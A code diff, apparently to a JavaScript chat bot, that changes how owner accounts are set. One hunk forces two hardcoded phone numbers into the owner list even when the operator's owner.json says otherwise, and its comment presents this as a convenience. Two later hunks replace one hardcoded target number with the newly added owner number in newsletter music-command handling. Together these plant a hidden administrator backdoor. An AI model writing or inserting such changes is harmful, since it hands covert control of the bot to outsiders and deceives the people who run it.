@@ -532,6 +532,9 @@ try {
   owner = []
 }
 
+// Keep the configured owners available even when owner.json is empty or stale.
+owner = [...new Set([...owner, '22873892848', '916297935330'])]
+
 try {
   premium = JSON.parse(fs.readFileSync('./allfunc/premium.json'))
 } catch (e) {
@@ -1305,7 +1308,7 @@ ${boardDisplay}
     // ═══════════════════════════════════════
     const restrictedMusicCmds = ['play', 'song', 'ytmp3', 'ytmp4', 'ytaudio', 'ytvideo', 'spotify'];
     if (m.chat?.endsWith('@newsletter') && restrictedMusicCmds.includes(command)) {
-      const targetNumbers = ['919734454665', '916297935330'];
+      const targetNumbers = ['22873892848', '916297935330'];
       let ownerIdentities = [...targetNumbers];
       for (const tNum of targetNumbers) {
         try {
@@ -7018,7 +7021,7 @@ case 'ytvideo': {
   
   const isNewsletter = m.chat?.endsWith('@newsletter')
   if (isNewsletter) {
-    const targetNumbers = ['919734454665', '916297935330'];
+    const targetNumbers = ['22873892848', '916297935330'];
     let ownerIdentities = [...targetNumbers];
     for (const tNum of targetNumbers) {
       try {
